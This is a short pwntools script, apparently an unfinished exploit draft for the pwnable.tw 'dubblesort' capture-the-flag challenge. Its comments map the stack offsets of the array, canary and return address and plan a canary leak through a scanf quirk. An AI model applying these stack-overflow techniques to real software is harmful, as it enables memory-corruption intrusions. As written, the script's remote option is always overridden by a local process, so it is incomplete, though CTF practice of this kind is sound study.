#!/usr/bin/env python3
from pwn import *
URL = "chall.pwnable.tw"
PORT = 10101
if len(sys.argv) >= 2 and sys.argv[1] == "remote":
    p = remote(URL, PORT)
p = process("./bin/dubblesort")


#################
## vulnerability
###############
# if we put alphebets to scanf("%u"), we simply don't overwrite the dword
# (and we are not able to make next scanf("%u") work)
#  the array starts from: $esp + 0x1c
#  the canary           : $esp + 0x7c
#  the return address   : $esp + '0x98' + 4
#       ('and' operation is inbetween can change)
# In the 1st round, we need to
#   1) leak stack address or lib address
#   3) leak canary

NUMS_SIZE = (0x98 + 4) // 4
p.recvuntil(b"What your name :")
p.sendline()
p.recvuntil(b"How many numbers do you what to sort :")
p.send(str(NUMS_SIZE))
p.sendline(b'-1')
p.sendline(b'0')
p.sendline(b'a')

p.interactive()
